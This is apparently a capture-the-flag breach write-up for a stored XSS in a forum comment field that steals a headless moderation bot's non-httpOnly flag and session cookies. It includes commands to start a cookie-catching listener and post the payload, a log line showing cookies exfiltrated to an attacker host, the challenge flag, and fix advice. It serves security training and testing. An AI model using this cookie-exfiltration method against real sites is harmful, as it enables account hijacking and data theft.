# Breach: stored-xss-cookie-theft (flag of choice)

**Severity:** Critical
**Yields a flag:** Yes — `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}`

## Explanation

`POST /forum/{thread_id}/comment` stores the `content` field and renders it
**unescaped** ("HTML is supported for formatting" per the site's own UI copy
and HTML comments). A privileged moderation bot (headless Chrome) visits
new/updated threads with a live session, and its `flag` cookie is **not**
`httpOnly`, so injected JS can read and exfiltrate it.

The forum thread's HTML comment even admits it:

> *the moderation bot opens every thread with a live session... and a "flag"
> cookie that isn't httpOnly*

## Exploitation

Two resources in this folder:

- `xss-listener.py` — a tiny HTTP server on `0.0.0.0:8888` that logs every
  GET/POST (including exfiltrated cookies) to `hits.log`.
- `post-payload.sh` — posts the `<img onerror>` payload to a forum thread
  as an authenticated user.

```bash
python3 xss-listener.py &        # start listener
./post-payload.sh http://localhost:4942 bbeo32ucx0a65b8 10.0.2.2:8888 cookies_jdoe.txt
```

> The listener must be reachable from the bot's vantage — see the Environment
> note in [`../walkthrough.md`](../walkthrough.md). Current setup: the bot
> runs inside a VirtualBox NAT VM and the operator on the host, so
> `10.0.2.2:8888` is the address to pass; `127.0.0.1` only works if the bot
> and the operator share a network namespace.

`hits.log` is created in the current working directory; stop the listener
with `kill %1`.

Within 1–2 minutes the moderation bot visits the thread, executes the payload,
and the listener appends one line per hit to `hits.log`:

```
2026-10-21 14:03:22.123456 GET /xss-hit?c=session=<jwt>; flag=FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l} from 127.0.0.1 headers={'Host': '<attacker_host>:8888', 'User-Agent': 'Mozilla/5.0 ... HeadlessChrome/120.0.6099.28 ...', 'Origin': 'http://127.0.0.1:4942'}
```

`hits.log` lines are already URL-decoded by the listener, so the exfiltrated
cookies — the `flag` cookie and the bot's `session` JWT (`login: moderator`) —
are readable as-is in the log.

Note: the bot requests the app via `http://127.0.0.1:4942` (loopback) —
it runs server-side, inside the VM itself. That is what makes the follow-up
breach (`../03-stored-xss-bot-ssrf-flag`) possible.

## Impact

- Theft of the bot's non-httpOnly `flag` cookie.
- A reliable "read anything the bot's browser can see" primitive.

## Fix recommendation

- Sanitize/escape all user-supplied HTML in forum content.
- Mark all session/privileged cookies `httpOnly`.
- Least privilege + short-lived tokens for the moderation bot.
